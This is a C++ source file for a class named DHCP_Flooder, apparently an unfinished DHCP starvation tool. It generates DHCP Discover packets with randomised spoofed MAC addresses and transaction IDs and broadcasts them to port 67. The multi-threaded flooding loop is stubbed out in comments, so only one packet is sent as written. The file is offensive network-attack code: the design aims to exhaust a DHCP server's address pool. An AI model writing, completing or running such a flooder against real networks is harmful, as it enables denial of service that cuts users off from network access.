//
// Created by AJ Hermosillo on 3/4/25.
//
#include <iostream>
#include <thread>
#include <sys/socket.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <chrono>
#include <random>

#include "./DHCP_Packet.hpp"


class DHCP_Flooder
{
public:
    explicit DHCP_Flooder(size_t size) : mPacketPool(size) {}
     ~DHCP_Flooder() = default;

    void start(unsigned int threads)
    {
        initPacketPool();

        sendPacket();

        // for (int i = 0 ; i < threads ; i++)
        //     mThreads.emplace_back(sendPackets, i);
        //
        // for (auto& thread : mThreads)
        //     thread.join();
    }

private:
    static void genRandMac(uint8_t mac[])
    {
        thread_local std::mt19937 gen(std::random_device{}());
        static std::uniform_int_distribution<> dis(0, 255);

        mac[0] = 0x52;
        mac[1] = 0x54;
        mac[2] = 0x00;
        mac[3] = dis(gen) & 0x7F;
        mac[4] = dis(gen);
        mac[5] = dis(gen);
    }

    static DHCP_Packet genPacket()
    {
        DHCP_Packet packet{};
        packet.op = 1;      // BOOT REQUEST;
        packet.htype = 1;   // ETHERNET;
        packet.hlen = 6;    // MAC Address Length
        packet.hops = 0;
        packet.secs = 0;
        packet.flags = htons(0x8000); // Broadcast
        packet.ciaddr = 0;
        packet.yiaddr = 0;
        packet.siaddr = 0;
        packet.giaddr = 0;

        genRandMac(packet.chaddr);

        // DHCP Discover options
        packet.options[0] = 53;  // DHCP Message Type
        packet.options[1] = 1;   // Length
        packet.options[2] = 1;   // Discover
        packet.options[3] = 255; // End option

        // Randomize XID
        packet.xid = rand();

        return packet;
    }

    void initPacketPool()
    {
        for (auto& packet : mPacketPool)
        {
            packet = genPacket();
        }
    }

    // static void sendPackets(int threadId)
    // {
    //     // SOCK_DGRAM, used for UDP, connectionless messages of fixed length
    //     int sock = socket(AF_INET, SOCK_DGRAM, 0);
    //     std::cout << "Sock: " << sock << "\n";
    //
    //     if (sock < 0)
    //         return;
    //
    //     int broadcast = 1;
    //     if (setsockopt(sock, SOL_SOCKET, SO_BROADCAST, &broadcast, sizeof(broadcast)))
    //         return;
    //
    //     sockaddr_in addr;
    //     memset(&addr, 0, sizeof(addr));
    //
    //
    //
    // }

    static void sendPacket()
    {
        int sock = socket(AF_INET, SOCK_DGRAM, 0);
        if (sock < 0)
            return;

        int broadcast = 1;
        if (setsockopt(sock, SOL_SOCKET, SO_BROADCAST, &broadcast, sizeof(broadcast)) < 0)
        {
            std::print("Error setting option");
            close(sock);
            return;
        }

        sockaddr_in addr{};
        memset(&addr, 0, sizeof(addr));
        addr.sin_family = AF_INET;
        addr.sin_port = htons(67);
        addr.sin_addr.s_addr = INADDR_BROADCAST;

        DHCP_Packet packet = genPacket();

        printf("Mac Address: %x:", packet.chaddr[0]);
        printf("%x:", packet.chaddr[1]);
        printf("%x:", packet.chaddr[2]);
        printf("%x:", packet.chaddr[3]);
        printf("%x:", packet.chaddr[4]);
        printf("%x\n", packet.chaddr[5]);
        printf("TXID: %d\n", packet.xid);

        if (sendto(sock, &packet, sizeof(DHCP_Packet), 0, reinterpret_cast<sockaddr*>(&addr), sizeof(addr)) < 0)
        {
            std::print("Failed to send packet");
            return;
        }

        close(sock);
    }


    size_t mPoolSize{};
    std::vector<DHCP_Packet> mPacketPool;
    std::vector<std::thread> mThreads;

};